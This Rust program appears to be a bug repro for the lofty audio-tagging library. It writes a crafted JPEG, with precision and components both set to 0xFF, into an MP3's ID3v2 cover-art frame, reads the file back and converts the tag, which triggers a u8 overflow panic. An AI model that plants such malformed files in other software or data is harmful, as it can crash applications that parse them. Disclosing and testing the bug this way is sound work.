// End-to-end repro: a real MP3 file on disk carries an ID3v2 `APIC` frame whose embedded
// image data is a malformed JPEG (SOF0 marker with precision = 0xFF, components = 0xFF).
//
// Step 1 writes that frame into a real MP3 file using lofty's own public ID3v2 writer
// (`Tag::save_to_path`), exactly as any real tagging tool would.
//
// Step 2 reads the file back from disk using lofty's real public reader
// (`lofty::read_from_path`), exercising the real `AttachedPictureFrame::parse` path that any
// caller opening an untrusted MP3 would go through. The `Picture`'s raw JPEG bytes returned here
// come straight from the on-disk ID3v2 frame, not from anything hand-injected in-process.
//
// Step 3 performs the real, public `From<Tag> for VorbisComments` conversion (used whenever
// lofty carries a generic `Tag`'s pictures into a FLAC/OGG file), which is what actually calls
// `PictureInformation::from_picture` -> `PictureInformation::from_jpeg` on the picture's raw
// bytes and hits the `u8` multiplication overflow.

use lofty::config::WriteOptions;
use lofty::ogg::OggPictureStorage;
use lofty::ogg::tag::VorbisComments;
use lofty::picture::{MimeType, Picture, PictureType};
use lofty::prelude::*;
use lofty::tag::{Tag, TagType};

use std::io::Write;

// A JPEG SOF0 (0xFFC0) marker with precision = 0xFF, components = 0xFF, taken straight into the
// picture bytes an attacker would embed in a real APIC frame.
const MALICIOUS_JPEG: &[u8] = &[
    0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x02, // SOI + empty APP0 marker
    0xFF, 0xC0, 0x00, 0x11, // SOF0 marker, length = 17
    0xFF, // precision = 0xFF
    0x00, 0x64, // height = 100
    0x00, 0x64, // width = 100
    0xFF, // components = 0xFF  ->  precision * components overflows u8
];

const BASE_MP3: &[u8] = include_bytes!("../assets/base.mp3");

fn main() {
    let dir = tempfile::tempdir().expect("create temp dir");
    let path = dir.path().join("malicious.mp3");

    {
        let mut f = std::fs::File::create(&path).expect("create mp3");
        f.write_all(BASE_MP3).expect("write base mp3");
    }

    // Step 1: write a real ID3v2 tag, with a real APIC frame carrying the malformed JPEG, into
    // a real MP3 file on disk - using lofty's own public writer.
    let malicious_picture = Picture::unchecked(MALICIOUS_JPEG.to_vec())
        .pic_type(PictureType::CoverFront)
        .mime_type(MimeType::Jpeg)
        .build();

    let mut tag = Tag::new(TagType::Id3v2);
    tag.push_picture(malicious_picture);
    if let Err(e) = tag.save_to_path(&path, WriteOptions::default()) {
        eprintln!("save_to_path failed: {e}");
        eprintln!("source: {:?}", std::error::Error::source(&e));
        panic!("write id3v2 tag with malicious APIC frame to mp3 file");
    }

    println!(
        "wrote {} byte MP3 file with a real ID3v2 APIC frame containing a malformed JPEG",
        std::fs::metadata(&path).unwrap().len()
    );

    // Step 2: read the file back from disk through lofty's real public entry point. This
    // exercises the real ID3v2/APIC parser - the returned `Picture`'s raw bytes come straight
    // from what was physically on disk, not from anything constructed in-process.
    let tagged_file = lofty::read_from_path(&path).expect("read mp3 back from disk");
    let tag = tagged_file
        .primary_tag()
        .expect("primary tag present")
        .clone();

    let pictures: Vec<_> = tag.pictures().to_vec();
    println!(
        "read back {} picture(s) from the real ID3v2 APIC frame on disk",
        pictures.len()
    );
    for p in &pictures {
        println!("  picture: {:?}", p);
    }

    // Step 3: the real, public `From<Tag> for VorbisComments` conversion - exactly what lofty
    // does internally to carry a generic `Tag`'s pictures over when writing to a FLAC/OGG file
    // (see `VorbisCommentsRef`/`create_vorbis_comments_ref` in `lofty::ogg::tag`). This is what
    // actually calls `PictureInformation::from_picture` -> `from_jpeg` on the untrusted bytes
    // that just came off disk.
    println!("converting Tag -> VorbisComments (this is where PictureInformation::from_jpeg runs)...");
    let vorbis_comments: VorbisComments = tag.into();

    // Only reached if the overflow did NOT panic (i.e. the bug is fixed).
    println!(
        "RESULT: no panic, {} picture(s) survived conversion",
        vorbis_comments.pictures().len()
    );
    std::process::exit(0);
}
